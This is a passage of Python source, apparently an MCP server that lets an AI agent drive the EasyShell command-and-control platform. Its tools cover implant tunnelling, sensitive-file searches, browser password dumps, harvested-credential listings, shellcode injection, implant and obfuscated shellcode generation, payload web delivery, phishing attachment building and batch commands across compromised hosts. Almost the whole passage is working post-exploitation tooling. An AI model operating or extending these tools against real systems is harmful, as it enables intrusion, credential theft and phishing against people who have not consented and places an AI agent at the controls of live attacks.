            p.write_bytes(raw)
        else:
            p = _screenshot_base_dir() / (
                f"history_{int(result_id)}_{time.strftime('%Y%m%d_%H%M%S')}{_sniff_image_ext(raw)}"
            )
            p.write_bytes(raw)
    except Exception as e:
        return f"图片已取回但本地保存失败: {e}"
    return (
        f"已下载截屏记录 id={result_id} → {p}（{len(raw)} bytes）\n"
        "  对话展示: 用图像查看能力打开上面的本地路径即可查看截图"
    )


@mcp.tool()
async def easyshell_screen_history_delete(result_id: int) -> str:
    """删除 TeamServer 截屏历史中的一条归档（库记录 + 磁盘文件）。

    Args:
        result_id: easyshell_screen_history 返回的 id
    """
    api = _get_api()
    try:
        resp = await api.request("DELETE", "client/screen/history", json_body={"id": int(result_id)})
    except Exception as e:
        return f"删除失败: {_http_err_text(e)}"
    if isinstance(resp, dict) and not resp.get("error") and resp.get("status") in (200, None):
        return f"已删除截屏记录 id={result_id}"
    return f"删除失败: {_err(resp)}"


# ============================================================
# SOCKS5 隧道扩展
# ============================================================

@mcp.tool()
async def easyshell_list_tunnels(uid: str = "") -> str:
    """列出 SOCKS5/TCP/UDP 隧道。

    Args:
        uid: 可选，按植入体 UID 过滤
    """
    api = _get_api()
    params: dict = {"page": 1, "page_size": 100}
    if uid.strip():
        params["uid"] = uid.strip()
    resp = await api.get("socks5/list", params=params)
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = (resp.get("data") or {}).get("list") or []
    if not items:
        return "没有隧道"
    lines = ["UID | 端口 | 类型 | 跳数 | Phase | 流量↑/↓ | 备注"]
    lines.append("-" * 88)
    for t in items:
        phase = str(t.get("Phase") or ("online" if t.get("Status") == 1 else "stopped"))
        up = int(t.get("StatsBytesUp") or 0)
        down = int(t.get("StatsBytesDown") or 0)
        traffic = f"{up}/{down}"
        chain = str(t.get("RouteChain") or "").strip()
        hops = len(chain.split(":")) if chain else 1
        lines.append(
            "  %-10s | %-5s | %-8s | %-3s | %-8s | %-12s | %s"
            % (
                str(t.get("Uid", "?"))[:10],
                str(t.get("Socks5port", "?"))[:5],
                str(t.get("Type", "socks5"))[:8],
                str(hops),
                phase[:8],
                traffic[:12],
                str(t.get("Remark", ""))[:24],
            )
        )
        if chain:
            lines.append(f"    └─ {chain[:72]}{'…' if len(chain) > 72 else ''}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_tunnel_probe(uid: str, port: int, target: str = "") -> str:
    """深度探测隧道：监听/植入体在线/本地握手；SOCKS5 可填 target 做 CONNECT 端到端验证。

    Args:
        uid: 植入体 UID
        port: 隧道端口
        target: 可选，SOCKS5 经隧道 CONNECT 的目标 host:port
    """
    api = _get_api()
    body = {"uid": uid.strip(), "Socks5port": str(port), "UserName": "", "Password": ""}
    lst = await api.get("socks5/list", params={"uid": uid.strip(), "page": 1, "page_size": 50})
    if _ok(lst):
        for t in (lst.get("data") or {}).get("list") or []:
            if str(t.get("Socks5port")) == str(port):
                body["UserName"] = t.get("UserName") or ""
                body["Password"] = t.get("Password") or ""
                break
    if target.strip():
        body["Target"] = target.strip()
    resp = await api.post("socks5/probe", json_body=body)
    if not _ok(resp):
        return f"探测失败: {_err(resp)}"
    data = resp.get("data") or {}
    if isinstance(data, dict):
        lines = [str(data.get("message") or "探测完成"), f"Phase: {data.get('Phase', '?')}", "检查项:"]
        for c in data.get("checks") or []:
            mark = "OK" if c.get("ok") else "FAIL"
            lines.append(f"  [{mark}] {c.get('name')}: {c.get('message')}")
        return "\n".join(lines)
    return str(data)


@mcp.tool()
async def easyshell_tunnel_reconcile() -> str:
    """校正异常隧道：将 DB 运行中但本地未监听的条目置为停止。"""
    api = _get_api()
    resp = await api.post("socks5/reconcile", json_body={})
    if _ok(resp):
        data = resp.get("data") or {}
        return str(data.get("message") or f"已修正 {data.get('reconciled', 0)} 条")
    return f"校正失败: {_err(resp)}"


@mcp.tool()
async def easyshell_tunnel_test(uid: str, port: int) -> str:
    """测试 SOCKS5 隧道连通性（TeamServer 本机探测）。

    Args:
        uid: 植入体 UID
        port: 隧道端口
    """
    api = _get_api()
    body = {"uid": uid.strip(), "Socks5port": str(port), "UserName": "", "Password": ""}
    lst = await api.get("socks5/list", params={"uid": uid.strip(), "page": 1, "page_size": 50})
    if _ok(lst):
        for t in (lst.get("data") or {}).get("list") or []:
            if str(t.get("Socks5port")) == str(port):
                body["UserName"] = t.get("UserName") or ""
                body["Password"] = t.get("Password") or ""
                break
    resp = await api.post("socks5/test", json_body=body)
    if _ok(resp):
        return resp.get("data") or "探测成功"
    return f"探测失败: {_err(resp)}"


@mcp.tool()
async def easyshell_tunnel_curl(
    port: int,
    url: str,
    method: str = "GET",
    headers: str = "",
    data: str = "",
    timeout: int = 30,
) -> str:
    """通过 SOCKS5 隧道发 HTTP 请求（本机 curl --socks5）。

    Args:
        port: 隧道端口（TeamServer 本机监听）
        url: 目标 URL
        method: HTTP 方法
        headers: 请求头，每行 Key: Value
        data: 请求体
        timeout: 超时秒数
    """
    cmd = [
        "curl", "-s", "-S", "--socks5", f"127.0.0.1:{port}",
        "-X", method.upper(), "--max-time", str(timeout),
    ]
    if headers.strip():
        for line in headers.strip().splitlines():
            line = line.strip()
            if line and ":" in line:
                cmd.extend(["-H", line])
    if data and method.upper() in ("POST", "PUT", "PATCH"):
        cmd.extend(["--data", data])
    cmd.append(url)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
        output = result.stdout or result.stderr or "(空)"
        return _truncate(output, 6000)
    except subprocess.TimeoutExpired:
        return "curl 超时"
    except FileNotFoundError:
        return "curl 未安装"


# ============================================================
# 插件 / 内存执行
# ============================================================

@mcp.tool()
async def easyshell_list_plugins(uid: str = "", os_type: str = "windows") -> str:
    """列出可内存执行的插件候选（已登记 + Extensions 目录）。

    Args:
        uid: 可选，用于 postex_helper 架构解析
        os_type: windows | linux
    """
    api = _get_api()
    params: dict = {"os": os_type}
    if uid.strip():
        params["uid"] = uid.strip()
    resp = await api.get("plugin/memory-exec-candidates", params=params)
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无可内存执行插件"
    lines = ["来源 | 模式 | 相对路径", "-" * 80]
    for it in items[:80]:
        lines.append(
            "  %-10s | %-14s | %s"
            % (
                str(it.get("source", "?"))[:10],
                str(it.get("mode", "?"))[:14],
                str(it.get("relPath", it.get("label", "?")))[:60],
            )
        )
    if len(items) > 80:
        lines.append(f"... 还有 {len(items) - 80} 条")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_list_script_plugins(os_type: str = "windows") -> str:
    """列出 Extensions 脚本插件菜单（CNA 迁移 JSON manifest）。

    Args:
        os_type: windows | linux | darwin
    """
    api = _get_api()
    resp = await api.get("client/script-plugins/manifest", params={"os": os_type})
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    data = resp.get("data") or {}
    roots = data.get("roots") or []
    if not roots:
        return "无脚本插件"
    lines = [f"脚本插件 v{data.get('version', '?')} ({len(roots)} 根节点):"]

    def _walk(nodes: list, depth: int = 0) -> None:
        for n in nodes[:30]:
            label = n.get("label") or n.get("name") or "?"
            lines.append("  " * depth + f"- {label}")
            children = n.get("children") or []
            if children and depth < 2:
                _walk(children, depth + 1)

    _walk(roots)
    return "\n".join(lines)


# ============================================================
# 后渗透：敏感信息 / 浏览器 / 凭据
# ============================================================

@mcp.tool()
async def easyshell_search_sensitive(uid: str, path: str) -> str:
    """下发敏感文件搜索（Windows 走 postex_helper，结果存服务端 DB）。

    Args:
        uid: 植入体 UID
        path: 扫描路径，如 C:/ 或 C:/Users
    """
    api = _get_api()
    resp = await api.post("client/searchsensitive", json_body={"uid": uid.strip(), "path": path})
    if _ok(resp):
        return f"已下发敏感搜索: {path}。等待 30–60s 后调用 easyshell_list_sensitive"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_list_sensitive(uid: str) -> str:
    """列出植入体敏感搜索结果摘要。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    resp = await api.get(f"sensitive/list/{uid.strip()}")
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无敏感搜索结果"
    lines = ["ID | 路径 | 摘要", "-" * 70]
    for it in items[:50]:
        content = str(it.get("content", ""))[:80].replace("\n", " ")
        lines.append(
            "  %-6s | %-25s | %s"
            % (it.get("id", "?"), str(it.get("searchPath", "?"))[:25], content)
        )
    lines.append(f"共 {len(items)} 条，详情用 easyshell_read_sensitive(id)")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_read_sensitive(result_id: int) -> str:
    """读取敏感搜索结果全文。

    Args:
        result_id: easyshell_list_sensitive 返回的 ID
    """
    api = _get_api()
    resp = await api.get(f"sensitive/content/{result_id}")
    if not _ok(resp):
        return f"读取失败: {_err(resp)}"
    return _truncate(str(resp.get("data") or ""))


@mcp.tool()
async def easyshell_dump_browser(uid: str, wait_seconds: int = 45) -> str:
    """下发浏览器密码 dump（Chrome/Edge 等，结果存服务端 DB）。

    Args:
        uid: 植入体 UID
        wait_seconds: 下发后等待秒数再拉取结果，0=仅下发
    """
    api = _get_api()
    resp = await api.post("client/dumpbrowser", json_body={"uid": uid.strip()})
    if not _ok(resp):
        return f"下发失败: {_err(resp)}"
    if wait_seconds <= 0:
        return "已下发浏览器 dump，稍后调用 easyshell_list_dump_browser"
    await asyncio.sleep(min(wait_seconds, 120))
    list_resp = await api.get(f"dumpbrowser/list/{uid.strip()}")
    if not _ok(list_resp):
        return f"已下发，但拉取结果失败: {_err(list_resp)}"
    items = list_resp.get("data") or []
    if not items:
        return f"已下发，等待 {wait_seconds}s 后仍无结果（可能权限不足或浏览器未安装）"
    lines = [f"浏览器 dump ({len(items)} 条):"]
    for it in items[:20]:
        lines.append(
            f"  [{it.get('id')}] {it.get('browserName')} / {it.get('category')}: "
            + str(it.get("content", ""))[:200]
        )
    return _truncate("\n".join(lines))


@mcp.tool()
async def easyshell_list_dump_browser(uid: str) -> str:
    """列出浏览器密码 dump 结果。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    resp = await api.get(f"dumpbrowser/list/{uid.strip()}")
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无浏览器 dump 结果"
    lines = ["ID | 浏览器 | 类别 | 内容摘要", "-" * 70]
    for it in items[:30]:
        lines.append(
            "  %-4s | %-10s | %-8s | %s"
            % (
                it.get("id", "?"),
                str(it.get("browserName", "?"))[:10],
                str(it.get("category", "?"))[:8],
                str(it.get("content", ""))[:60].replace("\n", " "),
            )
        )
    return "\n".join(lines)


@mcp.tool()
async def easyshell_list_credentials(uid: str = "") -> str:
    """列出 TeamServer 收集的凭据（mimikatz/浏览器/脚本插件等）。

    Args:
        uid: 可选，按植入体过滤
    """
    api = _get_api()
    params = {"uid": uid.strip()} if uid.strip() else None
    resp = await api.get("credentials/list", params=params)
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无凭据记录"
    lines = ["ID | UID | 目标 | 用户 | 类型 | 来源", "-" * 80]
    for c in items[:50]:
        lines.append(
            "  %-4s | %-8s | %-15s | %-12s | %-8s | %s"
            % (
                c.get("id", "?"),
                str(c.get("uid", "?"))[:8],
                str(c.get("target", "?"))[:15],
                str(c.get("username", "?"))[:12],
                str(c.get("cred_type", "?"))[:8],
                str(c.get("source", "?"))[:20],
            )
        )
    lines.append(f"共 {len(items)} 条")
    return "\n".join(lines)


# ============================================================
# 本机 HTTP（Nacos/禅道等，不经植入体）
# ============================================================

@mcp.tool()
async def easyshell_send_http(
    url: str,
    method: str = "GET",
    headers: str = "",
    body: str = "",
    timeout: int = 30,
) -> str:
    """从 MCP 运行环境直接发 HTTP 请求（探测 Nacos/禅道等，不经隧道）。

    Args:
        url: 目标 URL
        method: GET/POST/PUT/DELETE
        headers: 每行 Key: Value
        body: 请求体
        timeout: 超时秒数
    """
    hdrs = _parse_headers(headers)
    try:
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            r = await client.request(method.upper(), url, headers=hdrs, content=body or None)
        parts = [f"HTTP {r.status_code}", f"URL: {url}"]
        for k, v in list(r.headers.items())[:12]:
            parts.append(f"{k}: {v}")
        parts.append("")
        text = r.text
        parts.append(_truncate(text, 6000))
        return "\n".join(parts)
    except Exception as e:
        return f"请求失败: {e}"


# ============================================================
# 植入体详情 / 备注 / 进程操作
# ============================================================

@mcp.tool()
async def easyshell_get_client(uid: str) -> str:
    """获取单个植入体详细信息。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    items = await _fetch_clients(api)
    if not items:
        return "查询失败或无客户端"
    uid_in = uid.strip()
    try:
        uid_resolved = await _resolve_uid(api, uid_in)
    except ValueError as e:
        return str(e)
    for c in items:
        if str(c.get("Uid", "")).strip() == uid_resolved:
            lines = [f"UID: {c.get('Uid')}"]
            for k in ("Computer", "InternalIP", "ExternalIP", "Username", "Listener",
                       "Online", "Sleep", "Arch", "Group", "Note", "Pid", "Process", "ParentUid"):
                if c.get(k) not in (None, ""):
                    lines.append(f"  {k}: {c.get(k)}")
            return "\n".join(lines)
    return f"未找到 UID: {uid_in}"


@mcp.tool()
async def easyshell_get_note(uid: str) -> str:
    """读取植入体备注。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    resp = await api.get("client/note/get", params={"uid": uid.strip()})
    if _ok(resp):
        note = resp.get("data") or ""
        return note if note else "(无备注)"
    return f"读取失败: {_err(resp)}"


@mcp.tool()
async def easyshell_save_note(uid: str, content: str) -> str:
    """保存植入体备注（渗透笔记）。

    Args:
        uid: 植入体 UID
        content: 备注内容
    """
    api = _get_api()
    resp = await api.post("client/note/save", json_body={"uid": uid.strip(), "noteContent": content})
    if _ok(resp):
        return f"已保存备注 uid={uid}"
    return f"保存失败: {_err(resp)}"


@mcp.tool()
async def easyshell_kill_process(uid: str, pid: str) -> str:
    """结束植入体上的进程。

    Args:
        uid: 植入体 UID
        pid: 目标 PID
    """
    api = _get_api()
    resp = await api.post("client/pid/kill", json_body={"uid": uid.strip(), "pid": str(pid)})
    if _ok(resp):
        return f"已下发 kill {pid}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_inject_process(
    uid: str,
    pid: str,
    arch: str = "x64",
    listener: str = "",
) -> str:
    """向目标进程注入 shellcode（Windows）。

    Args:
        uid: 植入体 UID
        pid: 目标 PID
        arch: x64 | x86
        listener: 监听器连接串，如 websocket://1.2.3.4:8080
    """
    api = _get_api()
    resp = await api.post("client/pid/inject", json_body={
        "uid": uid.strip(), "pid": str(pid), "arch": arch,
        "listener": listener, "allocator": "", "execute": "",
    })
    if _ok(resp):
        return f"已下发注入 PID={pid}"
    return f"失败: {resp.get('error') or _err(resp)}"


@mcp.tool()
async def easyshell_migrate_process(
    uid: str,
    pid: str,
    arch: str = "x64",
    listener: str = "",
) -> str:
    """迁移植入体到目标进程（Windows）。

    Args:
        uid: 植入体 UID
        pid: 目标 PID
        arch: x64 | x86
        listener: 监听器连接串
    """
    api = _get_api()
    resp = await api.post("client/pid/migrate", json_body={
        "uid": uid.strip(), "pid": str(pid), "arch": arch,
        "listener": listener, "allocator": "", "execute": "",
    })
    if _ok(resp):
        return f"已下发迁移 PID={pid}"
    return f"失败: {resp.get('error') or _err(resp)}"


# ============================================================
# 文件下载（植入体 → TeamServer → 本机）
# ============================================================

@mcp.tool()
async def easyshell_request_download(uid: str, remote_path: str) -> str:
    """请求从植入体下载文件到 TeamServer（异步，需轮询进度）。

    Args:
        uid: 植入体 UID
        remote_path: 植入体上的完整文件路径
    """
    api = _get_api()
    resp = await api.post("client/file/download", json_body={
        "uid": uid.strip(), "filePath": remote_path,
    })
    if _ok(resp):
        return f"已下发下载: {remote_path}。用 easyshell_list_downloads 查看进度"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_list_downloads(uid: str = "") -> str:
    """列出文件下载任务进度。

    Args:
        uid: 可选，按植入体过滤
    """
    api = _get_api()
    params = {"uid": uid.strip()} if uid.strip() else None
    resp = await api.get("client/downloads/info", params=params)
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无下载任务"
    lines = ["UID | 路径 | 状态 | 进度", "-" * 80]
    for d in items[:30]:
        size = d.get("FileSize") or 0
        done = d.get("DownloadedSize") or 0
        pct = f"{done}/{size}" if size else str(d.get("DownloadState", "?"))
        lines.append(
            "  %-8s | %-30s | %-10s | %s"
            % (
                str(d.get("Uid", "?"))[:8],
                str(d.get("FilePath", "?"))[:30],
                str(d.get("DownloadState", d.get("QueueState", "?")))[:10],
                pct,
            )
        )
    return "\n".join(lines)


@mcp.tool()
async def easyshell_pull_download(uid: str, remote_path: str, local_path: str) -> str:
    """将 TeamServer 已下载完成的文件保存到本机。

    Args:
        uid: 植入体 UID
        remote_path: 原植入体文件路径
        local_path: 本机保存路径
    """
    api = _get_api()
    try:
        data = await api.download_binary(
            "client/downloads/downloaded_file",
            json_body={"uid": uid.strip(), "filePath": remote_path},
            timeout=600,
        )
    except Exception as e:
        return f"拉取失败: {e}（确认 easyshell_list_downloads 显示已完成）"
    if not data:
        return "空文件或下载未完成"
    p = Path(local_path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return f"已保存 {len(data)} bytes → {local_path}"


@mcp.tool()
async def easyshell_upload_status(uid: str) -> str:
    """查看植入体文件上传进度。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    try:
        uid = await _resolve_uid(api, uid.strip())
    except ValueError as e:
        return str(e)
    resp = await api.get("client/uploads/info", params={"uid": uid})
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无上传任务"
    lines = ["文件名 | 进度 | 大小 | 状态", "-" * 60]
    for u in items[:20]:
        lines.append(_format_upload_job(u))
    return "\n".join(lines)


# ============================================================
# 插件执行 / 正向连接
# ============================================================

@mcp.tool()
async def easyshell_execute_plugin(uid: str, plugin_id: int, args: str = "") -> str:
    """执行已登记插件（plugin 表中的 id）。

    Args:
        uid: 植入体 UID
        plugin_id: easyshell_list_plugins 中 registered 来源的 id
        args: 参数字符串
    """
    api = _get_api()
    resp = await api.post("plugin/execute", json_body={
        "id": plugin_id, "uid": uid.strip(), "args": args,
    })
    if _ok(resp):
        return f"已执行插件 id={plugin_id} args={args}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_forward_connect(
    conn_type: str,
    address: str,
    proxy: str = "",
) -> str:
    """正向连接植入体（TeamServer 主动连出）。

    Args:
        conn_type: websocket | tcp
        address: 目标 host:port
        proxy: 可选 SOCKS5 代理，如 socks5://127.0.0.1:1080
    """
    api = _get_api()
    resp = await api.post("forward-connection", json_body={
        "type": conn_type.strip().lower(),
        "address": address.strip(),
        "proxy": proxy.strip(),
    })
    if _ok(resp):
        data = resp.get("data") or {}
        return (
            f"正向连接已建立\n"
            f"  temp_uid: {data.get('temp_uid')}\n"
            f"  server: {data.get('server') or data.get('type')}\n"
            f"  {data.get('message', '')}"
        )
    return f"失败: {_err(resp)}"


# ============================================================
# 监听器管理
# ============================================================

@mcp.tool()
async def easyshell_listener_control(action: str, listen_address: str) -> str:
    """开启/关闭/删除监听器。

    Args:
        action: open | close | delete
        listen_address: 监听地址，如 0.0.0.0:8080
    """
    api = _get_api()
    action = action.strip().lower()
    path_map = {"open": "listener/open", "close": "listener/close", "delete": "listener/delete"}
    if action not in path_map:
        return "action 必须是 open / close / delete"
    resp = await api.post(path_map[action], json_body={"listenAddress": listen_address.strip()})
    if _ok(resp):
        return f"监听器 {listen_address} 已 {action}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_add_listener(
    listener_type: str,
    listen_address: str,
    connect_address: str,
    ws_path: str = "/ws",
) -> str:
    """添加并启动监听器（常用 websocket/tcp）。

    Args:
        listener_type: websocket | tcp | kcp | http-beacon | https-beacon | dns | oss
        listen_address: 监听地址 host:port
        connect_address: 植入体回连地址 host:port
        ws_path: WebSocket 路径（websocket 类型）
    """
    api = _get_api()
    body = {
        "type": listener_type.strip(),
        "listenAddress": listen_address.strip(),
        "connectAddress": connect_address.strip(),
        "wsPath": ws_path,
        "defaultSleepSec": 5,
        "jitterPercent": 8,
    }
    resp = await api.post("listener/add", json_body=body)
    if _ok(resp):
        return f"已添加监听器 {listener_type} {listen_address}"
    return f"失败: {_err(resp)}"


# ============================================================
# Web 投递 / TCP 端口转发隧道
# ============================================================

@mcp.tool()
async def easyshell_list_webdelivery() -> str:
    """列出 Web 投递任务。"""
    api = _get_api()
    resp = await api.get("webdelivery/list")
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无 Web 投递"
    lines = ["端口 | OS/Arch | 监听器 | 状态 | 下载URL", "-" * 90]
    for w in items[:20]:
        status = "运行" if w.get("Status") == 1 else "停止"
        url = w.get("DownloadURL") or w.get("downloadURL") or ""
        lines.append(
            "  %-5s | %-12s | %-15s | %-4s | %s"
            % (
                str(w.get("ListeningPort", "?"))[:5],
                f"{w.get('OS','?')}/{w.get('Arch','?')}"[:12],
                str(w.get("ListenerConfig", "?"))[:15],
                status,
                str(url)[:40],
            )
        )
    return "\n".join(lines)


# ============================================================
# 载荷生成 / Web 投递 / Shellcode / 钓鱼 Hub
# ============================================================

@mcp.tool()
async def easyshell_gen_payload(
    os_type: str,
    arch_type: str,
    listener: str,
    output_path: str,
    pass_phrase: str = "",
    implant_lang: str = "rust",
    legacy_upx: bool = False,
) -> str:
    """生成植入体 PE/ELF 并保存到本机（对应 Web /Server 客户端生成）。

    Args:
        os_type: windows | linux | darwin
        arch_type: amd64 | 386 | arm64 等
        listener: 监听器，格式 protocol://host:port
        output_path: 本机保存路径
        pass_phrase: 植入体连接密码（可选）
        implant_lang: rust | go（go 仅 windows）
        legacy_upx: 是否 UPX 压缩
    """
    api = _get_api()
    body = {
        "osType": os_type.strip(),
        "archType": arch_type.strip(),
        "listener": listener.strip(),
        "pass": pass_phrase,
        "implantLang": implant_lang.strip() or "rust",
        "legacyUpx": legacy_upx,
    }
    try:
        data = await api.download_binary("client/GenServer", json_body=body, timeout=300)
    except Exception as e:
        return f"生成失败: {e}"
    if not data or len(data) < 64:
        return "生成失败: 响应为空或过短"
    p = Path(output_path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return f"已生成 {len(data)} bytes → {output_path}（{os_type}/{arch_type} {implant_lang}）"


@mcp.tool()
async def easyshell_gen_shellcode(
    listener: str,
    output_path: str,
    os_type: str = "windows",
    arch_type: str = "amd64",
    pass_phrase: str = "",
    use_sgn: bool = False,
) -> str:
    """生成 stageless shellcode 并保存到本机。

    Args:
        listener: protocol://host:port
        output_path: 本机 .bin 保存路径
        os_type: 默认 windows
        arch_type: amd64 | 386
        pass_phrase: 连接密码
        use_sgn: 是否 SGN 混淆
    """
    api = _get_api()
    body = {
        "osType": os_type.strip(),
        "archType": arch_type.strip(),
        "listener": listener.strip(),
        "pass": pass_phrase,
        "format": "bin",
        "sgn": use_sgn,
    }
    try:
        data = await api.download_binary("shellcode/stageless", json_body=body, timeout=300)
    except Exception as e:
        return f"生成失败: {e}"
    if not data:
        return "生成失败: 空响应"
    p = Path(output_path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return f"已生成 shellcode {len(data)} bytes → {output_path}"


@mcp.tool()
async def easyshell_start_webdelivery(
    listener: str,
    os_name: str,
    arch: str,
    port: str,
    filename: str = "",
    pass_phrase: str = "",
    use_sgn: bool = False,
) -> str:
    """启动 Web 投递（HTTP 下载植入体）。

    Args:
        listener: protocol://connectAddress
        os_name: windows | linux | darwin
        arch: amd64 | 386 | arm64
        port: TeamServer 上 Web 投递监听端口（未被占用）
        filename: 下载文件名（可空，自动默认）
        pass_phrase: 植入体密码
        use_sgn: stage 模式 SGN（若适用）
    """
    api = _get_api()
    body = {
        "listener": listener.strip(),
        "os": os_name.strip(),
        "arch": arch.strip(),
        "port": str(port).strip(),
        "filename": filename.strip(),
        "pass": pass_phrase,
        "sgn": use_sgn,
    }
    resp = await api.post("webdelivery/start", json_body=body)
    if _ok(resp):
        await asyncio.sleep(0.5)
        lst = await api.get("webdelivery/list")
        url = ""
        if _ok(lst):
            for w in lst.get("data") or []:
                if str(w.get("ListeningPort", "")) == str(port):
                    url = w.get("ServerAddress") or w.get("DownloadURL") or ""
                    break
        return f"Web 投递已启动 端口 {port}" + (f"\n下载: {url}" if url else "")
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_webdelivery_control(action: str, port: str) -> str:
    """控制 Web 投递：close | delete | open | temp-unlock | temp-revoke。

    Args:
        action: close/delete/open/temp-unlock/temp-revoke
        port: Web 投递端口
    """
    api = _get_api()
    action = action.strip().lower()
    port = str(port).strip()
    path_map = {
        "close": "webdelivery/close",
        "delete": "webdelivery/delete",
        "open": "webdelivery/open",
        "temp-unlock": "webdelivery/temp-unlock",
        "temp-revoke": "webdelivery/temp-revoke",
    }
    if action not in path_map:
        return "action 必须是 close / delete / open / temp-unlock / temp-revoke"
    body: dict = {"port": port}
    if action == "temp-unlock":
        body["durationSeconds"] = 900
    resp = await api.post(path_map[action], json_body=body)
    if _ok(resp):
        return f"Web 投递 {port} 已 {action}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_gophish_status() -> str:
    """查询邮件钓鱼模块启用状态与钓鱼服务监听地址。"""
    api = _get_api()
    resp = await api.get("gophish-hub/status")
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    d = resp.get("data") or {}
    lines = [
        "邮件钓鱼模块",
        f"  启用: {d.get('enabled', '?')}",
        f"  就绪: {d.get('ready', '?')}",
    ]
    if d.get("phish_listen"):
        lines.append(f"  钓鱼监听: {d.get('phish_listen')}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_gophish_build_attachment(
    listener: str,
    os_type: str = "windows",
    arch_type: str = "amd64",
    payload_type: str = "stage_pe",
    zip_password: str = "",
    output_path: str = "",
) -> str:
    """为钓鱼模板生成载荷 ZIP 附件（EasyShell GenServer + 压缩）。

    Args:
        listener: protocol://host:port
        os_type: windows | linux | darwin
        arch_type: amd64 | 386 | arm64
        payload_type: stageless | stage_pe
        zip_password: ZIP 密码（可选）
        output_path: 若提供则保存 ZIP 到本机
    """
    api = _get_api()
    body = {
        "payloadType": payload_type.strip(),
        "listener": listener.strip(),
        "architectures": [{
            "osType": os_type.strip(),
            "archType": arch_type.strip(),
            "zipPassword": zip_password,
        }],
    }
    resp = await api.post("gophish-hub/build-attachment", json_body=body)
    if not _ok(resp):
        return f"生成失败: {_err(resp)}"
    data = resp.get("data") or {}
    att = data.get("attachment") or {}
    name = att.get("name") or data.get("zip_name") or "attachment.zip"
    b64 = att.get("content") or ""
    size = data.get("zip_bytes") or 0
    lines = [f"附件已生成: {name} ({size} bytes)", f"  架构: {os_type}/{arch_type}", f"  类型: {payload_type}"]
    if data.get("has_password"):
        lines.append("  含 ZIP 密码")
    if output_path.strip() and b64:
        raw = base64.b64decode(b64)
        p = Path(output_path.strip())
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(raw)
        lines.append(f"  已保存 → {output_path}")
    elif b64:
        lines.append("  （未指定 output_path，仅返回元数据；可在 Web 模板编辑器一键插入）")
    return "\n".join(lines)


# ============================================================
# 客户端分组 / 批量命令
# ============================================================

@mcp.tool()
async def easyshell_list_client_groups() -> str:
    """列出所有客户端分组名。"""
    api = _get_api()
    resp = await api.get("client/groups")
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    groups = resp.get("data") or []
    if not groups:
        return "暂无分组（未分组的植入体 group 为空）"
    return "客户端分组:\n" + "\n".join(f"  - {g}" for g in groups)


@mcp.tool()
async def easyshell_set_client_group(uid: str, group: str) -> str:
    """将植入体归入指定分组（空字符串=移出分组）。"""
    api = _get_api()
    resp = await api.post("client/group", json_body={"uid": uid.strip(), "group": group.strip()})
    if _ok(resp):
        return f"UID {uid} → 分组「{group or '(无)'}」"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_batch_exec(
    uids: str,
    command: str,
    timeout: int = 60,
    concurrency: int = 3,
) -> str:
    """对多台在线植入体下发相同命令（顺序/有限并发，适合分组批量）。

    Args:
        uids: 逗号或空格分隔的 UID 列表
        command: Shell 命令
        timeout: 单台最长等待秒数
        concurrency: 并发数 1–5
    """
    uid_list = [u.strip() for u in re.split(r"[,\s]+", uids.strip()) if u.strip()]
    if not uid_list:
        return "uids 为空"
    concurrency = max(1, min(concurrency, 5))
    sem = asyncio.Semaphore(concurrency)
    results: list[str] = []

    async def _one(uid: str) -> None:
        async with sem:
            out = await easyshell_exec_cmd(uid, command, timeout=timeout)
            snippet = _truncate(out.replace("\n", " "), 200)
            results.append(f"[{uid[:10]}] {snippet}")

    await asyncio.gather(*[_one(u) for u in uid_list])
    header = f"批量执行 {len(uid_list)} 台，并发 {concurrency}:\n" + "-" * 60
    return header + "\n" + "\n".join(results)


@mcp.tool()
async def easyshell_start_tcp_tunnel(uid: str, local_port: int, target_addr: str, group_key: str = "") -> str:
    """创建 TCP 端口转发隧道（TeamServer 本地端口 → 植入体侧目标）。

    Args:
        uid: 植入体 UID
        local_port: TeamServer 监听端口，0=自动
        target_addr: 植入体可达的目标 host:port
        group_key: 负载组键；同端口多 implant 轮询（TCP 组内 target 须一致）
    """
    api = _get_api()
    uid = await _resolve_uid(api, uid.strip())
    if local_port <= 0:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        local_port = s.getsockname()[1]
        s.close()
    resp = await api.post("socks5/start", json_body={
